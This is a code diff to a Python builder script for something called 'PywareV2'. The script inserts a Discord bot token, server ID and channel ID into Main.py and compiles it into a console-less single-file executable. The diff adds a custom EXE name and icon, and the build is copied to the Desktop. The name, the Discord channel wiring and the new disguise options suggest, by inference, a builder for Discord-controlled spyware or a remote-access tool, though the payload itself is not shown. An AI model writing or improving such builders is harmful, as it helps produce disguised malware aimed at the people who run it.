@@ -13,7 +13,6 @@ PLACEHOLDERS = {
 def set_title():
     os.system("title Setup PywareV2 - V1.2")
 
-
 def logo():
     print("""
   ____                             __     ______  
@@ -40,24 +39,26 @@ def ask_user_inputs():
         channel_id = input("👉 Channel-ID: ").strip()
         clear_screen()
         logo()
+        exe_name = input("👉 Name for the EXE file (without .exe): ").strip()
+        clear_screen()
+        logo()
 
-        # Bestätigung einholen
         print("Please double-check the following values:")
         print(f"|🔑 Token: {token}")
         print(f"|🖥️  Server ID: {server_id}")
         print(f"|💬 Channel ID: {channel_id}")
+        print(f"|📁 EXE Name: {exe_name}.exe")
         
-        confirmation = input("✅/❌ Do you want to build a .exe? (yes/no): ").strip().lower()
+        confirmation = input("✅/❌ Do you want to build the .exe? (yes/no): ").strip().lower()
         
         if confirmation in ["yes", "y"]:
             print("✔️ Confirmed.\n")
             clear_screen()
-            return token, server_id, channel_id
+            return token, server_id, channel_id, exe_name
         else:
             print("🔁 Let's try again...\n")
             clear_screen()
             logo()
-
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -81,23 +82,30 @@ def reset_placeholders(original_content):
         f.write(original_content)
     print("✅ Placeholders in Main.py have been reset")
 
-def build_exe():
+def build_exe(exe_name):
     print("⚙️ Creating EXE with PyInstaller...")
     subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'], check=True)
+    icon_path = os.path.join(os.getenv('LOCALAPPDATA'), 'PywareV2', 'EXE.ico')
+    if not os.path.exists(icon_path):
+        print(f"⚠️ Icon not found at: {icon_path}")
+        print("Proceeding without custom icon...")
+        icon_args = []
+    else:
+        print(f"✅ Using icon from: {icon_path}")
+        icon_args = ['--icon', icon_path]
 
     subprocess.run([
         'pyinstaller',
         '--onefile',
         '--noconsole',
+        '--name', exe_name,
+        *icon_args,
         MAIN_FILE
     ], check=True)
 
-    exe_name = os.path.splitext(MAIN_FILE)[0] + ".exe"
-    source = os.path.join("dist", exe_name)
-    
-    # Zielpfad auf den Desktop setzen
+    source = os.path.join("dist", f"{exe_name}.exe")
     desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
-    target = os.path.join(desktop_path, exe_name)
+    target = os.path.join(desktop_path, f"{exe_name}.exe")
 
     if os.path.exists(source):
         shutil.copy2(source, target)
@@ -127,13 +135,12 @@ def main():
     clear_screen()
     logo()
     set_title()
-    token, server_id, channel_id = ask_user_inputs()
-    
+    token, server_id, channel_id, exe_name = ask_user_inputs()
     
     original_content = replace_placeholders(token, server_id, channel_id)
     
     try:
-        build_exe()
+        build_exe(exe_name)
     finally:
         cleanup(original_content)
 
